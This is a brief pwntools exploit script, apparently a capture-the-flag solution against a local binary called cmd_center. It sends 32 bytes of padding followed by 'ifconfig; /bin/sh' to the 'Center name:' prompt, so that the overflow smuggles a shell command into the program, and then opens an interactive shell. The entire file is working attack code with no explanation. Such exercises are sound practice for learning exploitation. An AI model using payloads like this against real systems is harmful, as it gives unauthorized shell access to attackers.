from pwn import *

p = process("./cmd_center")
e = ELF("./cmd_center")


payload = b'A' * 32
payload += b"ifconfig; /bin/sh"

p.sendlineafter("Center name: ", payload)

p.interactive()

